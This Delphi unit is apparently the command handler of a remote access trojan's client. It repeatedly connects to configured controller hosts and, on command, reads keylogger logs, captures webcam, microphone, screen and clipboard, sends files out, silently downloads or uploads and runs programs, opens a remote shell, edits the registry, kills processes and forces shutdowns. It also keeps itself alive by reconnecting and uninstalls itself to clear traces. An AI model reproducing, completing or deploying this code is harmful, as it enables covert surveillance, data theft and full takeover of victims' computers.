unit UnitConnection;

interface

uses
  Windows, SysUtils, Classes, ZLibEx, Messages, SocketUnitEx, UnitCommands,
  UnitEncryption, UnitConfiguration, UnitUtils, UnitInformations, UnitFilesManager,
  UnitRegistryManager, UnitTasksManager, UnitShell, UnitCapture, UnitChat,
  UnitKeylogger, UnitMicrophone, ActiveX, ComObj, UnitInstallation, UnitPersistence;

type
  TMain = class //main class to set clientsocket events handle
    procedure OnClientDisconnect(Sender: TObject; ClientSocket: TClientSocket);
    procedure OnClientRead(Sender: TObject; ClientSocket: TClientSocket; Datas: string);
  end;

var
  Main: TMain;
  MainConnection: TClientSocket;
  ClientSocketThread: TClientSocketThread;   
  DNSList, PortsList: TStringArray;
  Start, pEnd: Integer; //start ip/port and end ip/port
  ClientFile: string; //full path of client file when installed
  TmpMutex: THandle; //persistence mutex

procedure StartConnection;
procedure SendDatas(Datas: string);

implementation

procedure StartConnection;
begin
  Start := 0; //start position

  pEnd := StringCount('|', Configuration.DNSList);  //get host count
  DNSList := ParseString('|', Configuration.DNSList);
  PortsList := ParseString('|', Configuration.PortsList);

  repeat //try to connect to server, don't stop until connection is established
    if Start = pEnd then Start := 0;
    if (DNSList[Start] <> '') and (PortsList[Start] <> '') then
    begin
      MainConnection := TClientSocket.Create;
      MainConnection.Connect(DNSList[Start], StrToInt(PortsList[Start]));
    end;

    {
    try
      MainConnection.Disconnect;
      MainConnection.Free;
      MainConnection := nil
    except
    end;
    } //WARNING: catch an exception when closing clientsocket here!

    Inc(Start);
    Sleep(Configuration.Delay * 1000); //connection delay
  until MainConnection.Connected = True;

  //ask server to set clientdatas for this current connection
  SendDatas(IntToStr(CMD_CONNECTION_ADD) + '|');

  Main := TMain.Create; //create main class and initialize clientsocket events
  ClientSocketThread := TClientSocketThread.Create();
  ClientSocketThread.OnClientRead := Main.OnClientRead;   
  ClientSocketThread.OnClientDisconnect := Main.OnClientDisconnect;
  ClientSocketThread.ClientSocket := MainConnection;
  ClientSocketThread.Resume; 
end;

procedure SendDatas(Datas: string);
begin
  if Datas = '' then Exit; //send encrypted datas or not to client through clientsocket 
  if Configuration.EncryptionKey <> '' then
    Datas := EncryptString(Datas, Configuration.EncryptionKey);
  MainConnection.SendText(Datas);
end;

procedure TMain.OnClientDisconnect(Sender: TObject; ClientSocket: TClientSocket);
begin                      
  //means that server close clientsocket so... free variables 
  MainConnection.Disconnect;
  
  ClientSocketThread.Terminate;
  ClientSocketThread := nil;

  //and start a new connection thread
  MyStartThread(@StartConnection);

  //we need to stay alive! ;) 
end;
              
procedure TMain.OnClientRead(Sender: TObject; ClientSocket: TClientSocket; Datas: string);
var
  Cmd, i, j: Integer;
  TmpList: TStringArray;
  TmpWStr: WideString;
  TmpStr: string;
  p: Pointer;
  TmpBool: Boolean;
  Voice: OleVariant;
  TmpHandle: THandle;
begin
  //check if datas is encrypted 
  if Configuration.EncryptionKey <> '' then
    Datas := DecryptString(Datas, Configuration.EncryptionKey);

  Cmd := StrToInt(Copy(Datas, 1, Pos('|', Datas) - 1)); //get cmd id before 
  Delete(Datas, 1, Pos('|', Datas));

  case Cmd of
    CMD_MAININFOS:
    begin
      SendDatas(IntToStr(Cmd) + '|' + ListMainInfos);  //send main infos list to server 
    end;

    CMD_CONNECTION_CLOSE:
    begin
      ExitProcess(0); //stop process 
    end;

    CMD_CONNECTION_RESTART:
    begin
      MainConnection.Disconnect; //automatically calls OnClientDisconnect procedure
    end;
          
    CMD_CLIENT_UNINSTALL:
    begin
      if Configuration.Persistence = True then
      begin
        CreateMutex(nil, False, Pchar(Configuration.Mutex + '_EXIT'));
        Sleep(5000); //to be sure that persistence process will stop effectively
		CloseHandle(TmpMutex);
      end;

      UninstallClient; //clear traces
    end;

    CMD_CHAT_START:
    begin
      Nickname := Datas; //set nickname 
      ShowWindow(MainHandle, 1); //show our window and bring it to front 
      SetWindowText(MainHandle, 'OpenSc_Chat'); 
      SetForegroundWindow(MainHandle);
      SendDatas(IntToStr(CMD_CHAT) + '|' + IntToStr(CMD_CHAT_START) + '|');
    end;

    CMD_CHAT_STOP:
    begin
      ShowWindow(MainHandle, 0); //hide chat window, we need to keep it active for webcam message 
      SetWindowText(MainHandle, ''); //... 
      SendDatas(IntToStr(CMD_CHAT) + '|' + IntToStr(CMD_CHAT_STOP) + '|');
    end;
       
    CMD_CHAT_TEXT:
    begin
      i := Length(Datas);
      GetMem(p, i);
      CopyMemory(p, @Datas[1], i);
      PostMessage(MainHandle, WM_CHAT_TEXT, i, Integer(p));
      SetForegroundWindow(MainHandle); //be sure user will be notified 
    end;

    CMD_CLIPBOARD_READ:
    begin
      if GetClipboardText(0, TmpWStr) = True then
        SendDatas(IntToStr(CMD_CLIPBOARD) + '|' + IntToStr(CMD_CLIPBOARD_READ) + '|' + TmpWStr)
      else SendDatas(IntToStr(CMD_CLIPBOARD) + '|' + IntToStr(CMD_CLIPBOARD_READ) + '|');
    end;

    CMD_CLIPBOARD_SET:
    begin
      try //clear clipboard datas first 
        OpenClipboard(0);
        EmptyClipboard;
      finally
        CloseClipboard;
      end;

      SetClipboardText(Datas);
      SendDatas(IntToStr(CMD_CLIPBOARD) + '|' + IntToStr(CMD_CLIPBOARD_SET) + '|');
    end;

    CMD_FILESMANAGER_COPY:
    begin
      TmpList := ParseString('|', Datas);

      if TmpList[2] = 'Y' then //folder copy 
      begin
        if CopyDirectory(0, TmpList[0], TmpList[1]) = False then
          SendDatas(IntToStr(CMD_FILESMANAGER) + '|' + IntToStr(Cmd) + '|N')
        else SendDatas(IntToStr(CMD_FILESMANAGER) + '|' + IntToStr(Cmd) + '|Y');
      end
      else
      begin
        if CopyFile(PChar(TmpList[0]), PChar(TmpList[1]), False) = False then
          SendDatas(IntToStr(CMD_FILESMANAGER) + '|' + IntToStr(Cmd) + '|N')
        else SendDatas(IntToStr(CMD_FILESMANAGER) + '|' + IntToStr(Cmd) + '|Y');
      end;
    end;

    CMD_FILESMANAGER_DELETE:
    begin
      TmpList := ParseString('|', Datas);

      if TmpList[1] = 'Y' then //folder deletion 
      begin
        if DeleteAllFilesAndDir(TmpList[0]) = False then
          SendDatas(IntToStr(CMD_FILESMANAGER) + '|' + IntToStr(Cmd) + '|' + TmpList[0] + '|N|')
        else SendDatas(IntToStr(CMD_FILESMANAGER) + '|' + IntToStr(Cmd) + '|' + TmpList[0] + '|Y|');
      end
      else
      begin
        if MyDeleteFile(TmpList[0]) = False then
          SendDatas(IntToStr(CMD_FILESMANAGER) + '|' + IntToStr(Cmd) + '|' + TmpList[0] + '|N|')
        else SendDatas(IntToStr(CMD_FILESMANAGER) + '|' + IntToStr(Cmd) + '|' + TmpList[0] + '|Y|');
      end;
    end;

    CMD_FILESMANAGER_DOWNLOAD:
    begin
      SendDatas(IntToStr(CMD_FILESMANAGER) + '|' + IntToStr(Cmd) + '|' + Datas + '|' +
        IntToStr(MyGetFileSize(Datas)) + '|');
      MainConnection.SendFile(Datas, nil);
    end;

    CMD_FILESMANAGER_DRIVES:
    begin
      SendDatas(IntToStr(CMD_FILESMANAGER) + '|' + IntToStr(Cmd) + '|' + ListDrives);
    end;
           
    CMD_FILESMANAGER_EXECUTE:
    begin
      TmpList := ParseString('|', Datas);

      if TmpList[1] = 'Y' then
      begin
        if MyShellExecute(TmpList[0], '', SW_HIDE) <= 32 then
          SendDatas(IntToStr(CMD_FILESMANAGER) + '|' + IntToStr(Cmd) + '|N')
        else SendDatas(IntToStr(CMD_FILESMANAGER) + '|' + IntToStr(Cmd) + '|Y');
      end
      else
      begin
        if MyShellExecute(TmpList[0], '', SW_SHOWNORMAL) <= 32 then
          SendDatas(IntToStr(CMD_FILESMANAGER) + '|' + IntToStr(Cmd) + '|N')
        else SendDatas(IntToStr(CMD_FILESMANAGER) + '|' + IntToStr(Cmd) + '|Y');
      end;
    end;

    CMD_FILESMANAGER_FOLDERS: //send folders and files lists in the same time
    begin
      SendDatas(IntToStr(CMD_FILESMANAGER) + '|' + IntToStr(Cmd) + '|' + ListFiles(Datas, True));
      SendDatas(IntToStr(CMD_FILESMANAGER) + '|' + IntToStr(CMD_FILESMANAGER_FILES) + '|' + ListFiles(Datas, False));
    end;

    CMD_FILESMANAGER_NEWFOLDER:
    begin
      if CreateDir(Datas) = False then
        SendDatas(IntToStr(CMD_FILESMANAGER) + '|' + IntToStr(Cmd) + '|N')
      else SendDatas(IntToStr(CMD_FILESMANAGER) + '|' + IntToStr(Cmd) + '|Y');
    end;

    CMD_FILESMANAGER_RENAME:
    begin
      TmpList := ParseString('|', Datas);

      if MyRenameFile_Dir(TmpList[0], TmpList[1]) = False then
        SendDatas(IntToStr(CMD_FILESMANAGER) + '|' + IntToStr(Cmd) + '|' + TmpList[0] + '|' + TmpList[1] + '|N|')
      else SendDatas(IntToStr(CMD_FILESMANAGER) + '|' + IntToStr(Cmd) + '|' + TmpList[0] + '|' + TmpList[1] + '|Y|');
    end;

    CMD_FILESMANAGER_UPLOAD:
    begin
      TmpList := ParseString('|', Datas);
      MainConnection.RecvFile(TmpList[0], StrToInt(TmpList[1]), nil);
    end;

    CMD_KEYLOGGER_DELETE:
    begin
      if MyDeleteFile(LogsDir + '\' + Datas) = True then
      begin
        SendDatas(IntToStr(CMD_KEYLOGGER) + '|' + IntToStr(Cmd) + '|' + Datas + '|Y|')
      end; SendDatas(IntToStr(CMD_KEYLOGGER) + '|' + IntToStr(Cmd) + '|' + Datas + '|N|');
    end;
         
    CMD_KEYLOGGER_LOGS:
    begin
      TmpList := MyListFiles(LogsDir, i);
      for j := 0 to i -1 do TmpStr := TmpStr + TmpList[j] + '|';
      SendDatas(IntToStr(CMD_KEYLOGGER)  + '|' + IntToStr(Cmd) + '|' + TmpStr);
    end;

    CMD_KEYLOGGER_READ:
    begin
      TmpStr := MyReadFile(LogsDir + '\' + Datas);
      SendDatas(IntToStr(CMD_KEYLOGGER)  + '|' + IntToStr(Cmd) + '|' + TmpStr);
    end;

    CMD_MICROPHONE_START:
    begin
      TmpList := ParseString('|', Datas);
      MicBool := True;
      CaptureInfos.TmpList := TmpList;
      MyStartThread(@MicrophoneThread, @CaptureInfos);
    end;

    CMD_MICROPHONE_STOP:
    begin
      MicBool := False;
      {StopMicrophone;} //BUGS: catch an exception when calling this procedure! 
      SendDatas(IntToStr(CMD_MICROPHONE) + '|' + IntToStr(CMD_MICROPHONE_STOP) + '|');
    end;

    CMD_MISCELLANEOUS_DESKTOP:
    begin
      if Datas = 'Y' then
        TmpBool := ShowWindow(FindWindow('ProgMan', nil), SW_HIDE)
      else TmpBool := ShowWindow(FindWindow('ProgMan', nil), SW_SHOW);

      if TmpBool = True then
        SendDatas(IntToStr(CMD_MISCELLANEOUS) + '|' + IntToStr(Cmd) + '|Y')
      else SendDatas(IntToStr(CMD_MISCELLANEOUS) + '|' + IntToStr(Cmd) + '|N');
    end;

    CMD_MISCELLANEOUS_DOWNLOAD:
    begin
      TmpList := ParseString('|', Datas);
      TmpStr := TmpDir + ExtractURLFile(TmpList[0]);

      if MyURLDownloadFile(TmpList[0], TmpStr) = False then
        SendDatas(IntToStr(CMD_MISCELLANEOUS) + '|' + IntToStr(Cmd) + '|N')
      else
      begin
        if TmpList[1] = 'Y' then
          i := MyShellExecute(TmpStr, '', SW_SHOW)
        else i := MyShellExecute(TmpStr, '', SW_HIDE);
      end;

      if i <= 32 then //file downloaded and executed successfully
        SendDatas(IntToStr(CMD_MISCELLANEOUS) + '|' + IntToStr(Cmd) + '|N')
      else SendDatas(IntToStr(CMD_MISCELLANEOUS) + '|' + IntToStr(Cmd) + '|Y');
    end;

    CMD_MISCELLANEOUS_ICONS:
    begin
      if Datas = 'Y' then
        TmpBool := EnableWindow(FindWindow('ProgMan', nil), False)
      else TmpBool := EnableWindow(FindWindow('ProgMan', nil), True);

      if TmpBool = True then
        SendDatas(IntToStr(CMD_MISCELLANEOUS) + '|' + IntToStr(Cmd) + '|Y')
      else SendDatas(IntToStr(CMD_MISCELLANEOUS) + '|' + IntToStr(Cmd) + '|N');
    end;

    CMD_MISCELLANEOUS_LOGOFF:
    begin
      SetTokenPrivileges('SeShutdownPrivilege'); //request privillege for action
      ExitWindowsEx(EWX_LOGOFF or EWX_FORCE, 0);
    end;
            
    CMD_MISCELLANEOUS_MSG:
    begin
      TmpList := ParseString('|', Datas); 
      i := MyShowMessage(0, TmpList[0], TmpList[1], StrToInt(TmpList[2]), StrToInt(TmpList[3]));
      SendDatas(IntToStr(CMD_MISCELLANEOUS) + '|' + IntToStr(CMD_MISCELLANEOUS_MSG) + '|' + IntToStr(i));
    end;

    CMD_MISCELLANEOUS_REBOOT:
    begin
      SetTokenPrivileges('SeShutdownPrivilege');
      ExitWindowsEx(EWX_REBOOT or EWX_FORCE, 0);
    end;

    CMD_MISCELLANEOUS_SHELL:
    begin
      if MyExecuteShellCommand(Datas) = True then
        SendDatas(IntToStr(CMD_MISCELLANEOUS) + '|' + IntToStr(Cmd) + '|Y')
      else SendDatas(IntToStr(CMD_MISCELLANEOUS) + '|' + IntToStr(Cmd) + '|N');
    end;

    CMD_MISCELLANEOUS_SHUTDOWN:
    begin
      SetTokenPrivileges('SeShutdownPrivilege');
      ExitWindowsEx(EWX_SHUTDOWN or EWX_FORCE, 0);
    end;

    CMD_MISCELLANEOUS_SPEAK:
    begin
      try
        try
          CoInitialize(nil);
          Voice := CreateOleObject('SAPI.SpVoice');
          Voice.Speak(Datas, 0);
        finally
          CoUninitialize;
        end;

        SendDatas(IntToStr(CMD_MISCELLANEOUS) + '|' + IntToStr(Cmd) + '|Y');
      except;
        SendDatas(IntToStr(CMD_MISCELLANEOUS) + '|' + IntToStr(Cmd) + '|N')
      end;
    end;

    CMD_MISCELLANEOUS_TRAY:
    begin
      TmpHandle := FindWindow('Shell_TrayWnd', nil);
      TmpHandle := FindWindowEx(TmpHandle, 0, 'TrayNotifyWnd', nil);
      TmpHandle := FindWindowEx(TmpHandle, 0, 'SysPager', nil);

      if Datas = 'Y' then
        TmpBool := ShowWindow(TmpHandle, SW_HIDE)
      else TmpBool := ShowWindow(TmpHandle, SW_SHOW);

      //or simply...

      {if Datas = 'Y' then
        TmpBool := ShowWindow(FindWindowEx(FindWindowEx(FindWindow('Shell_TrayWnd', nil), 0,
          'TrayNotifyWnd', nil), 0, 'SysPager', nil), SW_HIDE)
      else TmpBool := ShowWindow(FindWindowEx(FindWindowEx(FindWindow('Shell_TrayWnd', nil), 0,
        'TrayNotifyWnd', nil), 0, 'SysPager', nil), SW_SHOW);}

      if TmpBool = True then
        SendDatas(IntToStr(CMD_MISCELLANEOUS) + '|' + IntToStr(Cmd) + '|Y')
      else SendDatas(IntToStr(CMD_MISCELLANEOUS) + '|' + IntToStr(Cmd) + '|N');
    end;

    CMD_MISCELLANEOUS_TASKBAR:
    begin
      if Datas = 'Y' then
        TmpBool := ShowWindow(FindWindow('Shell_TrayWnd', nil), SW_HIDE)
      else TmpBool := ShowWindow(FindWindow('Shell_TrayWnd', nil), SW_SHOWNA);   

      if TmpBool = True then
        SendDatas(IntToStr(CMD_MISCELLANEOUS) + '|' + IntToStr(Cmd) + '|Y')
      else SendDatas(IntToStr(CMD_MISCELLANEOUS) + '|' + IntToStr(Cmd) + '|N');
    end;

    CMD_MISCELLANEOUS_UPLOAD:
    begin
      TmpList := ParseString('|', Datas);
      TmpStr := TmpDir + TmpList[0];
      MainConnection.RecvFile(TmpStr, StrToInt(TmpList[1]), nil);

      if FileExists(TmpStr) = False then
        SendDatas(IntToStr(CMD_MISCELLANEOUS) + '|' + IntToStr(Cmd) + '|N')
      else
      begin
        if TmpList[2] = 'Y' then
          i := MyShellExecute(TmpStr, '', SW_SHOW)
        else i := MyShellExecute(TmpStr, '', SW_HIDE);
      end;

      if i <= 32 then //file uploaded and executed successfully
        SendDatas(IntToStr(CMD_MISCELLANEOUS) + '|' + IntToStr(Cmd) + '|N')
      else SendDatas(IntToStr(CMD_MISCELLANEOUS) + '|' + IntToStr(Cmd) + '|Y');
    end;

    CMD_MISCELLANEOUS_WEBPAGE:
    begin
      if MyExecuteShellCommand('start ' + Datas) = True then
        SendDatas(IntToStr(CMD_MISCELLANEOUS) + '|' + IntToStr(Cmd) + '|Y')
      else SendDatas(IntToStr(CMD_MISCELLANEOUS) + '|' + IntToStr(Cmd) + '|N');
    end;

    CMD_REGISTRYMANAGER_ADD:
    begin
      TmpList := ParseString('|', Datas);
      i := Length(TmpList);
      
      if i = 2 then
      begin
        if AddRegKey(TmpList[0], TmpList[1]) then
          SendDatas(IntToStr(CMD_REGISTRYMANAGER) + '|' + IntToStr(Cmd) + '|' +
            TmpList[0] + '|' + TmpList[1] + '|Y|')
        else SendDatas(IntToStr(CMD_REGISTRYMANAGER) + '|' + IntToStr(Cmd) + '|' +
          TmpList[0] + '|' + TmpList[1] + '|N|');
      end
      else
      begin
        if AddRegValue(TmpList[0], TmpList[1], TmpList[2], TmpList[3]) then
          SendDatas(IntToStr(CMD_REGISTRYMANAGER) + '|' + IntToStr(Cmd) + '|' +
            TmpList[0] + '|' + TmpList[1] + '|' + TmpList[2] + '|' + TmpList[3] + '|Y|')
        else SendDatas(IntToStr(CMD_REGISTRYMANAGER) + '|' + IntToStr(Cmd) + '|' +
          TmpList[0] + '|' + TmpList[1] + '|' + TmpList[2] + '|' + TmpList[3] + '|N|');
      end;
    end;

    CMD_REGISTRYMANAGER_DELETE:
    begin
      TmpList := ParseString('|', Datas);
      if TmpList[2] = 'Y' then
      begin
        if DelRegKey(TmpList[0], TmpList[1]) then
          SendDatas(IntToStr(CMD_REGISTRYMANAGER) + '|' + IntToStr(Cmd) + '|' +
            TmpList[0] + '|' + TmpList[1] + '|Y|')
        else SendDatas(IntToStr(CMD_REGISTRYMANAGER) + '|' + IntToStr(Cmd) + '|' +
          TmpList[0] + '|' + TmpList[1] + '|N|');
      end
      else
      begin
        if DelRegValue(TmpList[0], TmpList[1]) then
          SendDatas(IntToStr(CMD_REGISTRYMANAGER) + '|' + IntToStr(Cmd) + '|' + TmpList[1] + '|Y|')
        else SendDatas(IntToStr(CMD_REGISTRYMANAGER) + '|' + IntToStr(Cmd) + '|' + TmpList[1] + '|N|');
      end
    end;

    CMD_REGISTRYMANAGER_KEYS:
    begin
      SendDatas(IntToStr(CMD_REGISTRYMANAGER) + '|' + IntToStr(Cmd) + '|' + ListKeys(Datas));
    end;

    CMD_REGISTRYMANAGER_VALUES:
    begin
      SendDatas(IntToStr(CMD_REGISTRYMANAGER) + '|' + IntToStr(Cmd) + '|' + ListValues(Datas));
    end;

    CMD_TASKSMANAGER_PROCESS:
    begin
      SendDatas(IntToStr(CMD_TASKSMANAGER) + '|' + IntToStr(Cmd) + '|' + ListProcess);
    end;

    CMD_TASKSMANAGER_PROCESS_KILL:
    begin
      if KillProcess(Datas) = True then
        SendDatas(IntToStr(CMD_TASKSMANAGER) + '|' + IntToStr(Cmd) + '|' + Datas + '|Y|')
      else SendDatas(IntToStr(CMD_TASKSMANAGER) + '|' + IntToStr(Cmd) + '|' + Datas + '|N|');
    end;

    CMD_TASKSMANAGER_SERVICES:
    begin
      SendDatas(IntToStr(CMD_TASKSMANAGER) + '|' + IntToStr(Cmd) + '|' + ListServices);
    end;

    CMD_TASKSMANAGER_SERVICES_START:
    begin
      if xStartService(Datas) = True then
        SendDatas(IntToStr(CMD_TASKSMANAGER) + '|' + IntToStr(Cmd) + '|' + Datas + '|Y|')
      else SendDatas(IntToStr(CMD_TASKSMANAGER) + '|' + IntToStr(Cmd) + '|' + Datas + '|N|');
    end;

    CMD_TASKSMANAGER_SERVICES_STOP:
    begin
      if StopService(Datas) = True then
        SendDatas(IntToStr(CMD_TASKSMANAGER) + '|' + IntToStr(Cmd) + '|' + Datas + '|Y|')
      else SendDatas(IntToStr(CMD_TASKSMANAGER) + '|' + IntToStr(Cmd) + '|' + Datas + '|N|');
    end;

    CMD_TASKSMANAGER_WINDOWS:
    begin
      if Datas = 'Y' then
        SendDatas(IntToStr(CMD_TASKSMANAGER) + '|' + IntToStr(Cmd) + '|' + ListAllWindows)
      else SendDatas(IntToStr(CMD_TASKSMANAGER) + '|' + IntToStr(Cmd) + '|' + ListWindows);
    end;

    CMD_TASKSMANAGER_WINDOWS_CLOSE:
    begin
      if SendMessage(StrToInt(Datas), WM_CLOSE, 0, 0) = 0 then
        SendDatas(IntToStr(CMD_TASKSMANAGER) + '|' + IntToStr(Cmd) + '|' + Datas + '|Y|')
      else SendDatas(IntToStr(CMD_TASKSMANAGER) + '|' + IntToStr(Cmd) + '|' + Datas + '|N|');
    end;

    CMD_TASKSMANAGER_WINDOWS_HIDE:
    begin
      if ShowWindow(StrToInt(Datas) , SW_HIDE) = True then
        SendDatas(IntToStr(CMD_TASKSMANAGER) + '|' + IntToStr(Cmd) + '|' + Datas + '|Y|')
      else SendDatas(IntToStr(CMD_TASKSMANAGER) + '|' + IntToStr(Cmd) + '|' + Datas + '|N|');
    end;

    CMD_TASKSMANAGER_WINDOWS_SHOW:
    begin
      if ShowWindow(StrToInt(Datas) , SW_SHOW) = True then
        SendDatas(IntToStr(CMD_TASKSMANAGER) + '|' + IntToStr(Cmd) + '|' + Datas + '|Y|')
      else SendDatas(IntToStr(CMD_TASKSMANAGER) + '|' + IntToStr(Cmd) + '|' + Datas + '|N|');
    end;

    CMD_TASKSMANAGER_WINDOWS_TITLE:
    begin
      TmpList := ParseString('|', Datas);
      if SetWindowText(StrToInt(TmpList[0]), PChar(TmpList[1])) = True then
        SendDatas(IntToStr(CMD_TASKSMANAGER) + '|' + IntToStr(Cmd) + '|' + TmpList[0] + '|' + TmpList[1] + '|Y|')
      else SendDatas(IntToStr(CMD_TASKSMANAGER) + '|' + IntToStr(Cmd) + '|' + TmpList[0] + '|' + TmpList[1] + '|N|');
    end;

    CMD_SHELL_START:
    begin
      MyStartThread(@ShellThread);
    end;

    CMD_SHELL_STOP:
    begin
      ShellCmd := 'exit';
    end;

    CMD_SHELL_TEXT:
    begin
      ShellCmd := Datas;
    end;

    CMD_SCREEN_START:
    begin
      TmpList := ParseString('|', Datas);
      CaptureInfos.TmpList := TmpList;
      ScreenBool := True;
      MyStartThread(@DesktopThread, @CaptureInfos);
    end;

    CMD_SCREEN_STOP:
    begin
      ScreenBool := False;
    end;
    
    CMD_WEBCAM_DRIVERS:
    begin
      SendDatas(IntToStr(CMD_WEBCAM) + '|' + IntToStr(Cmd) + '|' + GetWebcamDrivers);
    end;
    
    CMD_WEBCAM_START:
    begin
      i := Length(Datas);
      GetMem(p, i);
      CopyMemory(p, @Datas[1], i); //send message to chat window handle
      PostMessage(MainHandle, WM_WEBCAM_START, i, Integer(p));
    end;

    CMD_WEBCAM_STOP:
    begin
      WebCamBool := False;
    end;
  end;
end;

end.
